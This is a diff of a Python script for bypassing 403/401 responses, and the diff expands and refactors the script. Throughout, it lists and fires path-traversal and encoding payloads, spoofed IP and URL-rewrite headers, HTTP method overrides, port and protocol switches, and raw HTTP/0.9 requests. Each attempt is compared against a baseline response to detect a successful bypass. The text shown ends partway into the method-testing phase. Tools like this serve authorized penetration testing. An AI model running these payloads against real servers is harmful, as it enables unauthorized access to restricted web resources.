@@ -4,8 +4,14 @@ import sys
 import argparse
 import random
 import string
+import json
+import hashlib
+import time
+import urllib3
 from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlparse, quote
+from urllib.parse import urlparse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class colors:
     RED = '\033[91m'
@@ -15,30 +21,36 @@ class colors:
     END = '\033[0m'
     BOLD = '\033[1m'
 
+# ---------------------------------------------------------------------------
+# Globals
+# ---------------------------------------------------------------------------
+BASELINE = {}
+RESULTS = []
+
+# ---------------------------------------------------------------------------
+# Helpers
+# ---------------------------------------------------------------------------
 def random_user_agent():
     browsers = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-        'hacking'
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
     ]
     return random.choice(browsers) + ' ' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
 
 def parse_custom_headers(header_list):
-    """Parse custom headers from command line arguments"""
     custom_headers = {}
     if not header_list:
         return custom_headers
-    
     for header in header_list:
         if ':' in header:
             key, value = header.split(':', 1)
             custom_headers[key.strip()] = value.strip()
         else:
             print(f"{colors.YELLOW}[!] Invalid header format (ignored): {header}{colors.END}")
-    
     return custom_headers
 
 def format_url(base_url, path):
-    """Formata a URL corretamente, garantindo uma única barra entre o domínio e o path"""
     base_url = base_url.rstrip('/')
     if not path:
         return base_url
@@ -46,32 +58,111 @@ def format_url(base_url, path):
     return f"{base_url}/{path}"
 
 def get_domain(url):
-    """Extrai o domínio da URL (sem protocolo e porta)"""
-    parsed = urlparse(url)
-    domain = parsed.netloc.split(':')[0]
-    return domain
+    return urlparse(url).netloc.split(':')[0]
 
-PATH_MANIPULATION_TECHNIQUES = [
-    # Basic techniques
+def body_signature(response):
+    body = response.content or b""
+    return len(body), hashlib.sha1(body).hexdigest()
+
+def safe_request(method, url, headers=None, timeout=5, max_retries=1, verbose=False):
+    for attempt in range(max_retries + 1):
+        try:
+            r = requests.request(
+                method.upper(),
+                url,
+                headers=headers,
+                timeout=timeout,
+                allow_redirects=False,
+                verify=False,
+            )
+            if r.status_code in (429, 503) and attempt < max_retries:
+                wait = 2 ** attempt
+                if verbose:
+                    print(f"{colors.YELLOW}    Rate limited ({r.status_code}), backing off {wait}s{colors.END}")
+                time.sleep(wait)
+                continue
+            return r
+        except requests.exceptions.RequestException as e:
+            if verbose:
+                print(f"{colors.RED}    Request error: {e}{colors.END}")
+            if attempt >= max_retries:
+                return None
+            time.sleep(0.5)
+    return None
+
+# ---------------------------------------------------------------------------
+# Baseline + bypass detection
+# ---------------------------------------------------------------------------
+def capture_baseline(url, path, custom_headers, verbose=False):
+    test_url = format_url(url, path) if path else url
+    req_headers = {"User-Agent": random_user_agent()}
+    if custom_headers:
+        req_headers.update(custom_headers)
+
+    r = safe_request("GET", test_url, req_headers, verbose=verbose)
+    if r is None:
+        BASELINE[path or ""] = None
+        return
+
+    length, h = body_signature(r)
+    BASELINE[path or ""] = {"status": r.status_code, "length": length, "hash": h}
+
+    if verbose:
+        print(f"{colors.BLUE}[*] Baseline {test_url} -> {r.status_code} ({length} bytes){colors.END}")
+
+def is_bypass(path, response):
+    if response is None:
+        return False
+    code = response.status_code
+    if code >= 400:
+        return False
+    if not (200 <= code < 400):
+        return False
+
+    base = BASELINE.get(path or "")
+    if base is None:
+        return 200 <= code < 400
+
+    length, h = body_signature(response)
+    if h == base["hash"]:
+        return False
+    if code == base["status"] and abs(length - base["length"]) < 32:
+        return False
+    return True
+
+# ---------------------------------------------------------------------------
+# Wordlists
+# ---------------------------------------------------------------------------
+PATH_MANIPULATION_TECHNIQUES = sorted(set([
     "{0}", "%2e/{0}", "%2f{0}/", "%2f{0}%2f", "./{0}/",
     "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
     "{0}?", "{0}.html", "{0}.php", "{0}#",
-
-    # Advanced techniques
     "{0}..;/", "{0};/", "//{0}///",
-    "{0}/ ".upper(), "*{0}/", "/{0}", "/{0}//",
+    "*{0}/", "/{0}", "/{0}//",
     "{0}../", "{0}/*", ";/{0}/", "/;//{0}/",
-    "{0}%00", "{0}/{0}.txt", "{0}.",
+    "{0}%00", "{0}.",
     "{0}..%2f", "{0}%20", "{0}%09", "{0}.json", "{0}.xml",
     "{0}%23", "{0}%3f", "{0}%26", "{0}%2e",
     "{0}..%00/", "{0}..%0d/", "{0}..%5c", "{0}..\\", "{0}..%ff/",
-    "{0}%2e%2e%2f", "{0}.%2e/", "{0}%3f", "{0}%26", "{0}%23",
-    "{0}/.", "{0}?", "{0}??", "{0}???", "{0}#",
-    "{0}/.randomstring", "{0}.html", "{0}%20/", "{0}%20assets%20/",
-    "{0}.json", "{0}\\..\\.\\", "{0}/*", "{0}/./", "{0}/*/",
+    "{0}%2e%2e%2f", "{0}.%2e/",
+    "{0}??", "{0}???",
+    "{0}/.randomstring", "{0}%20/", "{0}%20assets%20/",
+    "{0}\\..\\.\\", "{0}/./", "{0}/*/",
     "{0}/..;/", "{0}%2e/assets", "{0}/%2e/", "{0}//.", "{0}////",
-    "{0};assets/"
-]
+    "{0};assets/",
+    # Unicode / overlong / CRLF / Windows
+    "{0}%c0%af", "{0}%e0%80%af",
+    "{0}%0d", "{0}%0a", "{0}%0d%0a",
+    "{0}::$DATA",
+    "..;/{0}", "/..;/{0}", "..%00/{0}",
+    # New: whitespace / NEL trailing
+    "{0}%a0", "{0}%85", "{0}%c2%a0",
+    # New: backslash junk-prefix traversal
+    "a/..%5c{0}", "x/..%5c{0}", "junk/..%5c{0}",
+    "a/..\\{0}", "a/../{0}",
+    # New: fragment prefix traversal
+    "#/../{0}", "%23/../{0}", "#/{0}", "%23/{0}",
+]))
 
 BYPASS_HEADERS = [
     {"X-Forwarded-For": "127.0.0.1"},
@@ -80,20 +171,15 @@ BYPASS_HEADERS = [
     {"X-Remote-IP": "127.0.0.1"},
     {"X-Remote-Addr": "127.0.0.1"},
     {"X-ProxyUser-Ip": "127.0.0.1"},
-    {"X-Original-URL": ""},
-    {"X-Rewrite-URL": ""},
     {"Host": "localhost"},
-    {"X-Originally-Forwarded-For": "127.0.0.1, 68.180.194.242"},
-    {"X-Originating-": "127.0.0.1, 68.180.194.242"},
-    {"X-WAP-Profile": "127.0.0.1, 68.180.194.242"},
-    {"From": "127.0.0.1, 68.180.194.242"},
+    {"X-Originally-Forwarded-For": "127.0.0.1"},
+    {"From": "127.0.0.1"},
     {"Profile": "http://{domain}"},
     {"X-Arbitrary": "http://{domain}"},
     {"X-HTTP-DestinationURL": "http://{domain}"},
     {"X-Forwarded-Proto": "http://{domain}"},
     {"Destination": "127.0.0.1"},
     {"Proxy": "127.0.0.1"},
-    {"CF-Connecting_IP": "127.0.0.1"},
     {"CF-Connecting-IP": "127.0.0.1"},
     {"True-Client-IP": "127.0.0.1"},
     {"Base-Url": "127.0.0.1"},
@@ -109,421 +195,202 @@ BYPASS_HEADERS = [
     {"Url": "127.0.0.1"},
     {"X-Forward-For": "127.0.0.1"},
     {"X-Forwarded-By": "127.0.0.1"},
-    {"X-Forwarded-For-Original": "127.0.0.1"},
     {"X-Forwarded-Server": "127.0.0.1"},
     {"X-Forwarded": "127.0.0.1"},
     {"X-Forwarder-For": "127.0.0.1"},
-    {"X-Http-Destinationurl": "127.0.0.1"},
     {"X-Http-Host-Override": "127.0.0.1"},
     {"X-Original-Remote-Addr": "127.0.0.1"},
     {"X-Proxy-Url": "127.0.0.1"},
-    {"X-Real-Ip": "127.0.0.1"},
-    {"X-Remote-Addr": "127.0.0.1"},
-    {"X-OReferrer": "https%3A%2F%2Fwww.google.com%2F"},
     {"X-Forwarded-Scheme": "http"},
-    {"X-Forwarded-Scheme": "https"},
-    {"X-Forwarded-Proto": "http"},
-    {"X-Forwarded-Port": "80"},
-    {"X-Forwarded-Port": "443"},
-    {"X-Forwarded-Port": "8080"},
-    {"X-Forwarded-Port": "8443"},
-    {"X-Forwarded-Port": "4443"},
     {"Referer": "{target}"},
     {"Origin": "{target}"},
     {"X-Requested-With": "XMLHttpRequest"},
     {"X-Custom-IP-Authorization": "127.0.0.1"},
-    {"X-Custom-IP-Authorization..;/": "127.0.0.1"}
+    {"X-HTTP-Method-Override": "GET"},
+    {"X-HTTP-Method": "GET"},
+    {"X-Method-Override": "GET"},
+    {"X-Forwarded-Path": "/{path}"},
+    {"X-Override-URL": "/{path}"},
 ]
 
 HTTP_METHODS = [
     "GET", "POST", "PUT", "PATCH", "DELETE",
-    "UPDATE", "CONNECT", "DEBUG","CHECKOUT", "COPY",
-    "LOCK", "UNLOCK", "SEARCH", "MOVE", "TRACK"
+    "HEAD", "OPTIONS",
+    "DEBUG", "TRACK",
 ]
 
-PARAMETER_TECHNIQUES = [
-    "?#",
-    "?%23",
-    "?%3f",
-    "?%26",
-    "?%20",
-    "?%09",
-    "?..",
-    "?../",
-    "?..%2f",
-    "?..%00/",
-    "?..%0d/",
-    "?..%5c",
-    "?..\\",
-    "?..%ff/",
-    "?%2e%2e%2f",
-    "?.%2e/",
-    "?%3f",
-    "?%26",
-    "?%23",
-    "?%2e",
-    "?/.",
-    "??",
-    "???",
-    "?#",
-    "?/.randomstring",
-    "?.html",
-    "?%20/",
-    "?%20assets%20/",
-    "?.json",
-    "?\\..\\.\\",
-    "?/*",
-    "?/./",
-    "?/*/",
-    "?/..;/",
-    "?%2e/assets",
-    "?/%2e/",
-    "?//.",
-    "?////",
-    "?;assets/"
+PARAMETER_TECHNIQUES = sorted(set([
+    "?", "??", "???", "?#",
+    "?%23", "?%3f", "?%26", "?%20", "?%09",
+    "?..", "?../", "?..%2f", "?..%00/", "?..%0d/",
+    "?..%5c", "?..\\", "?..%ff/",
+    "?%2e%2e%2f", "?.%2e/", "?%2e",
+    "?/.", "?/.randomstring", "?.html", "?.json",
+    "?%20/", "?%20assets%20/",
+    "?\\..\\.\\", "?/*", "?/./", "?/*/",
+    "?/..;/", "?%2e/assets", "?/%2e/", "?//.", "?////", "?;assets/",
+]))
+
+ENCODING_TEMPLATES = [
+    "{0}%20", "{0}%09", "{0}%00", "{0}%0d", "{0}%0a",
+    "%2e/{0}", "%2f%2f{0}", "%2f{0}", "{0}%2f",
+    "{0};", "{0};/", "{0};x", "{0};x/",
+    "..;/{0}", "{0}/..;/",
+    "{0}%2e", "{0}%2e%2e", "{0}%2e%2e%2f",
+    "{0}/.", "{0}//", "{0}///",
+    "%2e/{0}/", "/{0}/.", "/{0}//", "//{0}",
+    "{0}%c0%af", "{0}%e0%80%af",
+    "{0}%a0", "{0}%85", "{0}%c2%a0",
 ]
 
-ENCODING_TECHNIQUES = [
-    "%09", "%09%3b", "%09..", "%09..;", "%09;",
-    "%20", "%23%3f", "%252f%252f", "%252f/",
-    "%2e%2e", "%2e%2e%3b/", "%2e%2e/", "%2e%2f/",
-    "%2e%3b/", "%2e%3b//", "%2e/", "%2e//", "%2f",
-    "%3b/", "..", "..%2f", "..%2f..%2f", "..%2f..%2f..%2f",
-    "../", "../../", "../../../", "../../..//",
-    "../..//", "../..//../", "../..;/", ".././../",
-    "../.;/../", "..//", "..//../", "..//../../",
-    "..//..;/", "../;/", "../;/../", "..;%2f",
-    "..;%2f..;%2f", "..;%2f..;%2f..;%2f", "..;/../",
-    "..;/..;/", "..;//", "..;//../", "..;//..;/",
-    "..;/;/", "..;/;/..;/", ".//", ".;/", ".;//",
-    "//..", "//../../", "//..;", "//./", "//.;/",
-    "///..", "///../", "///..//", "///..;", "///..;/",
-    "///..;//", "//;/", "/;/", "/;//", "/;x", "/;x/",
-    "/x/../", "/x/..//", "/x/../;/", "/x/..;/", "/x/..;//",
-    "/x/..;/;/", "/x//../", "/x//..;/", "/x/;/../",
-    "/x/;/..;/", ";", ";%09", ";%09..", ";%09..;",
-    ";%09;", ";%2F..", ";%2f%2e%2e", ";%2f%2e%2e%2f%2e%2e%2f%2f",
-    ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
-    ";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f",
-    ";%2f..%2f/../", ";%2f../%2f..%2f", ";%2f../%2f../",
-    ";%2f..//..%2f", ";%2f..//../", ";%2f..///",
-    ";%2f..///;", ";%2f..//;/", ";%2f..//;/;", ";%2f../;//",
-    ";%2f../;/;/", ";%2f../;/;/;", ";%2f..;///",
-    ";%2f..;//;/", ";%2f..;/;//", ";%2f/%2f../",
-    ";%2f//..%2f", ";%2f//../", ";%2f//..;/", ";%2f/;/../",
-    ";%2f/;/..;/", ";%2f;//../", ";%2f;/;/..;/", ";/%2e%2e",
-    ";/%2e%2e%2f%2f", ";/%2e%2e%2f/", ";/%2e%2e/", ";/%2e.",
-    ";/%2f%2f../", ";/%2f/..%2f", ";/%2f/../", ";/.%2e",
-    ";/.%2e/%2e%2e/%2f", ";/..", ";/..%2f", ";/..%2f%2f../",
-    ";/..%2f..%2f", ";/..%2f/", ";/..%2f//", ";/../",
-    ";/../%2f/", ";/../../", ";/../..//", ";/.././../",
-    ";/../.;/../", ";/..//", ";/..//%2e%2e/", ";/..//%2f",
-    ";/..//../", ";/..///", ";/../;/", ";/../;/../",
-    ";/..;", ";/.;.", ";//%2f../", ";//..", ";//../../",
-    ";///..", ";///../", ";///..//", ";///..;", ";///..;/",
-    ";x", ";x/", ";x;", "&", "%", "%09", "../",
-    "../%2f", ".././", "..%00/", "..%0d/", "..%5c",
-    "..\\", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f",
-    "%26", "%23", "%2e", "/.", "?", "??", "???",
-    "#", "/.randomstring", ".html", "%20/", "%20assets%20/",
-    ".json", "\\..\\.\\", "/*", "/./", "/*/", "/..;/",
-    "%2e/assets", "/%2e/", "//.", "////", ";assets/"
-]
-
+# ---------------------------------------------------------------------------
+# Test functions
+# ---------------------------------------------------------------------------
 def test_fuzzing(url, path=None, method="GET", headers=None, custom_headers=None, verbose=False):
-    """Test a single request with given parameters"""
-    try:
-        test_url = format_url(url, path) if path else url
+    test_url = format_url(url, path) if path else url
+    req_headers = {"User-Agent": random_user_agent()}
+    if custom_headers:
+        req_headers.update(custom_headers)
+    if headers:
+        processed = headers.copy()
+        for k, v in processed.items():
+            if v and isinstance(v, str):
+                if "{domain}" in v:
+                    processed[k] = v.replace("{domain}", get_domain(url))
+                if "{target}" in v:
+                    processed[k] = v.replace("{target}", url)
+                if "{path}" in v:
+                    processed[k] = v.replace("{path}", (path or "").lstrip('/'))
+        req_headers.update(processed)
 
-        req_headers = {"User-Agent": random_user_agent()}
-        
-        # Add custom headers first (so they can be overridden by technique-specific headers)
-        if custom_headers:
-            req_headers.update(custom_headers)
-        
-        if headers:
-            # Create a copy of headers to avoid modifying the original
-            processed_headers = headers.copy()
-
-            for k, v in processed_headers.items():
-                if v and isinstance(v, str):
-                    # Replace placeholders
-                    if "{domain}" in v:
-                        domain = get_domain(url)
-                        processed_headers[k] = v.replace("{domain}", domain)
-                    if "{target}" in v:
-                        processed_headers[k] = v.replace("{target}", url)
-                    if "{path}" in v:
-                        processed_headers[k] = v.replace("{path}", path.lstrip('/') if path else "")
-
-            req_headers.update(processed_headers)
-
-        if verbose:
-            print(f"{colors.BLUE}[*] Testing: {method} {test_url}{colors.END}")
-            if req_headers and len(req_headers) > 1:  # More than just User-Agent
-                print(f"{colors.BLUE}    Headers: {req_headers}{colors.END}")
-
-        # Verificação adicional para métodos malformados
-        if any(c.isspace() for c in method):
-            if verbose:
-                print(f"{colors.YELLOW}    Skipping malformed method: {method}{colors.END}")
-            return False, 0, None, None, None
-
-        if method.upper() == "GET":
-            response = requests.get(
-                test_url,
-                headers=req_headers,
-                timeout=5,
-                allow_redirects=True
-            )
-        else:
-            try:
-                response = requests.request(
-                    method.upper(),
-                    test_url,
-                    headers=req_headers,
-                    timeout=5,
-                    allow_redirects=True
-                )
-            except ValueError as e:
-                if "Method cannot contain non-token characters" in str(e):
-                    if verbose:
-                        print(f"{colors.YELLOW}    Skipping invalid method: {method}{colors.END}")
-                    return False, 0, None, None, None
-                raise
-
-        if response.status_code == 200:
-            return True, response.status_code, method, req_headers, path
-    except Exception as e:
-        if verbose:
-            print(f"{colors.RED}    Error: {e}{colors.END}")
-    return False, 0, None, None, None
-
-def test_protocol_switch(url, path=None, custom_headers=None, verbose=False):
-    """Test switching between HTTP/HTTPS protocols"""
-    base_url = url.replace('https://', 'http://') if url.startswith('https://') else url.replace('http://', 'https://')
-    test_url = format_url(base_url, path) if path else base_url
+    if any(c.isspace() for c in method):
+        return False, 0, None, None, None
 
     if verbose:
-        print(f"{colors.BLUE}[*] Testing protocol switch: {test_url}{colors.END}")
+        print(f"{colors.BLUE}[*] {method} {test_url}{colors.END}")
 
     try:
-        req_headers = {"User-Agent": random_user_agent()}
-        if custom_headers:
-            req_headers.update(custom_headers)
-            
-        response = requests.get(
-            test_url,
-            headers=req_headers,
-            timeout=5,
-            allow_redirects=True
-        )
+        r = safe_request(method, test_url, req_headers, verbose=verbose)
+    except ValueError:
+        return False, 0, None, None, None
 
-        if response.status_code == 200:
-            return True, response.status_code, "GET", req_headers, path, test_url
-    except Exception as e:
-        if verbose:
-            print(f"{colors.RED}    Error: {e}{colors.END}")
+    if is_bypass(path, r):
+        return True, r.status_code, method, req_headers, path
+    return False, 0, None, None, None
 
+def test_protocol_switch(url, path, custom_headers, verbose):
+    base_url = url.replace('https://', 'http://') if url.startswith('https://') else url.replace('http://', 'https://')
+    test_url = format_url(base_url, path) if path else base_url
+    req_headers = {"User-Agent": random_user_agent()}
+    if custom_headers:
+        req_headers.update(custom_headers)
+    if verbose:
+        print(f"{colors.BLUE}[*] Protocol switch: {test_url}{colors.END}")
+    r = safe_request("GET", test_url, req_headers, verbose=verbose)
+    if is_bypass(path, r):
+        return True, r.status_code, "GET", req_headers, path, test_url
     return False, 0, None, None, None, None
 
-def test_port_bypass(url, path=None, custom_headers=None, verbose=False):
-    """Test port bypass techniques"""
+def test_port_bypass(url, path, custom_headers, verbose):
     test_url = format_url(url, path) if path else url
-
-    ports = [80, 443, 8080, 8443, 4443]
-    headers = [{"X-Forwarded-Port": str(port)} for port in ports]
-
-    for header in headers:
-        try:
-            if verbose:
-                print(f"{colors.BLUE}[*] Testing port header: {header} on {test_url}{colors.END}")
-
-            req_headers = {"User-Agent": random_user_agent(), **header}
-            if custom_headers:
-                req_headers.update(custom_headers)
-                
-            response = requests.get(
-                test_url,
-                headers=req_headers,
-                timeout=5,
-                allow_redirects=True
-            )
-
-            if response.status_code == 200:
-                return True, response.status_code, "GET", req_headers, path
-        except Exception as e:
-            if verbose:
-                print(f"{colors.RED}    Error: {e}{colors.END}")
-
+    for port in [80, 443, 8080, 8443, 4443]:
+        h = {"User-Agent": random_user_agent(), "X-Forwarded-Port": str(port)}
+        if custom_headers:
+            h.update(custom_headers)
+        if verbose:
+            print(f"{colors.BLUE}[*] Port: {port} {test_url}{colors.END}")
+        r = safe_request("GET", test_url, h, verbose=verbose)
+        if is_bypass(path, r):
+            return True, r.status_code, "GET", h, path
     return False, 0, None, None, None
 
-def test_parameter_pollution(url, path=None, custom_headers=None, verbose=False):
-    """Tests parameter pollution techniques"""
+def test_method_override(url, path, custom_headers, verbose):
     if not path:
         return False, 0, None, None, None
-
-    base_url = url.rstrip('/')
-    effective_path = path.lstrip('/')
-
-    for technique in PARAMETER_TECHNIQUES:
-        try:
-            test_url = f"{base_url}/{effective_path}{technique}"
-
-            if verbose:
-                print(f"{colors.BLUE}[*] Testing parameter pollution: {test_url}{colors.END}")
-
-            req_headers = {"User-Agent": random_user_agent()}
+    test_url = format_url(url, path)
+    override_headers = [
+        {"X-HTTP-Method-Override": "GET"},
+        {"X-HTTP-Method": "GET"},
+        {"X-Method-Override": "GET"},
+    ]
+    for oh in override_headers:
+        for verb in ("POST", "PUT"):
+            h = {"User-Agent": random_user_agent(), **oh}
             if custom_headers:
-                req_headers.update(custom_headers)
-                
-            response = requests.get(
-                test_url,
-                headers=req_headers,
-                timeout=5,
-                allow_redirects=True
-            )
-
-            if response.status_code == 200:
-                return True, response.status_code, "GET", req_headers, f"{effective_path}{technique}"
-        except Exception as e:
+                h.update(custom_headers)
             if verbose:
-                print(f"{colors.RED}    Error: {e}{colors.END}")
-
+                print(f"{colors.BLUE}[*] Method override: {verb} {test_url} | {oh}{colors.END}")
+            r = safe_request(verb, test_url, h, verbose=verbose)
+            if is_bypass(path, r):
+                return True, r.status_code, verb, h, path
     return False, 0, None, None, None
 
-def test_encoding_techniques(url, path=None, custom_headers=None, verbose=False):
-    """Tests advanced encoding techniques"""
-    if not path:
-        return False, 0, None, None, None
-
-    effective_path = path.lstrip('/')
-
-    for technique in ENCODING_TECHNIQUES:
-        try:
-            if '{0}' in technique:
-                encoded_path = technique.format(effective_path)
-            else:
-                encoded_path = f"{effective_path}{technique}"
-
-            test_url = format_url(url, encoded_path)
-
-            if verbose:
-                print(f"{colors.BLUE}[*] Testing encoding: {test_url}{colors.END}")
-
-            req_headers = {"User-Agent": random_user_agent()}
-            if custom_headers:
-                req_headers.update(custom_headers)
-                
-            response = requests.get(
-                test_url,
-                headers=req_headers,
-                timeout=5,
-                allow_redirects=True
-            )
-
-            if response.status_code == 200:
-                return True, response.status_code, "GET", req_headers, encoded_path
-        except Exception as e:
-            if verbose:
-                print(f"{colors.RED}    Error: {e}{colors.END}")
-
-    return False, 0, None, None, None
-
-def test_http_0_9(url, path=None, verbose=False):
-    """Tests HTTP/0.9 connection"""
+def test_http_0_9(url, path, verbose):
     try:
         import socket
-
-        base_url = url.replace('https://', '').replace('http://', '').split('/')[0]
-        host = base_url.split(':')[0]
-        port = int(base_url.split(':')[1]) if ':' in base_url else 80
-
-        if url.startswith('https://'):
-            import ssl
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-
-        effective_path = f"/{path}" if path else "/"
+        parsed = urlparse(url)
+        host = parsed.hostname
+        is_https = url.startswith('https://')
+        port = parsed.port or (443 if is_https else 80)
+        eff = f"/{path.lstrip('/')}" if path else "/"
 
         if verbose:
-            print(f"{colors.BLUE}[*] Testing HTTP/0.9: {host}:{port}{effective_path}{colors.END}")
+            print(f"{colors.BLUE}[*] HTTP/0.9: {host}:{port}{eff}{colors.END}")
 
-        if url.startswith('https://'):
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s = context.wrap_socket(s, server_hostname=host)
-        else:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
-        s.connect((host, port))
-        s.sendall(f"GET {effective_path}\r\n".encode())
+        if is_https:
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=host)
 
-        data = s.recv(4096)
+        s.connect((host, port))
+        s.sendall(f"GET {eff}\r\n".encode())
+        data = b""
+        try:
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+                if len(data) > 8192:
+                    break
+        except socket.timeout:
+            pass
         s.close()
 
-        if data and b'<' in data and b'>' in data:
-            return True, 200, "HTTP/0.9", None, effective_path
+        if data and not data.startswith(b"HTTP/"):
+            return True, 200, "HTTP/0.9", None, eff
     except Exception as e:
         if verbose:
-            print(f"{colors.RED}    Error: {e}{colors.END}")
+            print(f"{colors.RED}    HTTP/0.9 error: {e}{colors.END}")
     return False, 0, None, None, None
 
-def test_root_header_override(url, path=None, custom_headers=None, verbose=False):
-    """
-    Technique: GET / with X-Original-URL or X-Rewrite-URL pointing to the forbidden path.
-    Some reverse proxies (nginx, IIS) apply access control based on the rewritten URL,
-    so hitting the root while injecting the real path in these headers can bypass 403/401.
-
-    Example:
-        GET / HTTP/1.1
-        Host: target.com
-        X-Original-URL: /admin
-    """
+def test_root_header_override(url, path, custom_headers, verbose):
     if not path:
         return []
-
-    effective_path = path if path.startswith('/') else f"/{path}"
+    eff = path if path.startswith('/') else f"/{path}"
     root_url = url.rstrip('/') + '/'
-
-    override_headers = [
-        "X-Original-URL",
-        "X-Rewrite-URL",
-    ]
-
     results = []
-    for header_name in override_headers:
-        req_headers = {"User-Agent": random_user_agent()}
+    for header_name in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Path"):
+        h = {"User-Agent": random_user_agent(), header_name: eff}
         if custom_headers:
-            req_headers.update(custom_headers)
-        req_headers[header_name] = effective_path
-
+            h.update(custom_headers)
         if verbose:
-            print(f"{colors.BLUE}[*] Testing root override: GET {root_url} | {header_name}: {effective_path}{colors.END}")
-
-        try:
-            response = requests.get(
-                root_url,
-                headers=req_headers,
-                timeout=5,
-                allow_redirects=False  # keep redirect as-is to detect real bypass
-            )
-
-            if response.status_code == 200:
-                results.append((True, response.status_code, "GET", req_headers, effective_path, root_url, header_name))
-            elif verbose:
-                print(f"{colors.YELLOW}    [{header_name}] Status: {response.status_code}{colors.END}")
-        except Exception as e:
-            if verbose:
-                print(f"{colors.RED}    Error: {e}{colors.END}")
-
+            print(f"{colors.BLUE}[*] Root override GET / | {header_name}: {eff}{colors.END}")
+        r = safe_request("GET", root_url, h, verbose=verbose)
+        if r and is_bypass(path, r):
+            results.append((True, r.status_code, "GET", h, eff, root_url, header_name))
     return results
 
+# ---------------------------------------------------------------------------
+# Output
+# ---------------------------------------------------------------------------
 def print_status(url, status_code, method, headers, path, extra_note=None):
-    """Exibe os resultados encontrados"""
     full_url = format_url(url, path) if path else url
-    print(f"\n{colors.GREEN}[*] Status 200 found{colors.END}")
+    print(f"\n{colors.GREEN}[+] BYPASS{colors.END}")
     print(f"URL: {full_url}")
     print(f"Method: {colors.BOLD}{method}{colors.END}")
     print(f"Status: {colors.BOLD}{status_code}{colors.END}")
@@ -536,6 +403,14 @@ def print_status(url, status_code, method, headers, path, extra_note=None):
                 print(f"  {k}: {v}")
     print("-" * 50)
 
+    RESULTS.append({
+        "url": full_url,
+        "method": method,
+        "status": status_code,
+        "headers": {k: v for k, v in (headers or {}).items()},
+        "note": extra_note,
+    })
+
 def load_wordlist(wordlist_file):
     try:
         with open(wordlist_file, 'r') as f:
@@ -544,179 +419,217 @@ def load_wordlist(wordlist_file):
         print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
         sys.exit(1)
 
-
+# ---------------------------------------------------------------------------
+# Orchestration
+# ---------------------------------------------------------------------------
 def run_tests(target_url, path, custom_headers=None, threads=20, verbose=False):
-    effective_path = path if path is not None else ""
+    eff_path = path if path is not None else ""
 
-    # Test protocol switch (HTTP/HTTPS)
-    success, code, method, headers, path, new_url = test_protocol_switch(target_url, effective_path, custom_headers, verbose)
-    if success:
-        print_status(new_url, code, method, headers, "")
-
-    # Test HTTP versions
-    success, code, method, headers, path = test_http_0_9(target_url, effective_path, verbose)
-    if success:
-        print_status(target_url, code, method, headers, path)
-
-    # Test port bypass
-    success, code, method, headers, path = test_port_bypass(target_url, effective_path, custom_headers, verbose)
-    if success:
-        print_status(target_url, code, method, headers, path)
-
-    # -----------------------------------------------------------------
-    # Test X-Original-URL / X-Rewrite-URL root override (new technique)
-    # GET / + header pointing to the forbidden path
-    # -----------------------------------------------------------------
-    if effective_path:
-        if verbose:
-            print(f"\n{colors.BOLD}[*] Testing X-Original-URL / X-Rewrite-URL Root Override{colors.END}")
-
-        for result in test_root_header_override(target_url, effective_path, custom_headers, verbose):
-            found, code, method, headers, matched_path, root_url, header_name = result
-            if found:
-                print_status(
-                    root_url, code, method, headers, "",
-                    extra_note=f"{header_name}: {matched_path} (request sent to /)"
-                )
-
-    # Test HTTP Methods
+    # 1. Baseline
     if verbose:
-        print(f"\n{colors.BOLD}[*] Testing HTTP Methods{colors.END}")
+        print(f"\n{colors.BOLD}[*] Phase 1/9: Baseline{colors.END}")
+    capture_baseline(target_url, eff_path, custom_headers, verbose)
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = []
-        for method in HTTP_METHODS:
-            # Verificação adicional antes de enviar
-            if any(c.isspace() for c in method):
-                if verbose:
-                    print(f"{colors.YELLOW}[*] Skipping malformed method: {method}{colors.END}")
+    # 2. Protocol switch
+    if verbose:
+        print(f"\n{colors.BOLD}[*] Phase 2/9: Protocol switch{colors.END}")
+    s, code, m, h, p, new_url = test_protocol_switch(target_url, eff_path, custom_headers, verbose)
+    if s:
+        print_status(new_url, code, m, h, "")
+
+    # 3. HTTP/0.9
+    if verbose:
+        print(f"\n{colors.BOLD}[*] Phase 3/9: HTTP/0.9{colors.END}")
+    s, code, m, h, p = test_http_0_9(target_url, eff_path, verbose)
+    if s:
+        print_status(target_url, code, m, h, p, extra_note="Raw HTTP/0.9 response")
+
+    # 4. Port bypass
+    if verbose:
+        print(f"\n{colors.BOLD}[*] Phase 4/9: Port bypass{colors.END}")
+    s, code, m, h, p = test_port_bypass(target_url, eff_path, custom_headers, verbose)
+    if s:
+        print_status(target_url, code, m, h, p)
+
+    # 5. Root header override
+    if eff_path:
+        if verbose:
+            print(f"\n{colors.BOLD}[*] Phase 5/9: Root header override{colors.END}")
+        for result in test_root_header_override(target_url, eff_path, custom_headers, verbose):
+            found, code, m, h, matched_path, root_url, header_name = result
+            if found:
+                print_status(root_url, code, m, h, "",
+                             extra_note=f"{header_name}: {matched_path} (sent to /)")
+
+    # 6. HTTP methods
+    if verbose:
+        print(f"\n{colors.BOLD}[*] Phase 6/9: HTTP methods{colors.END}")
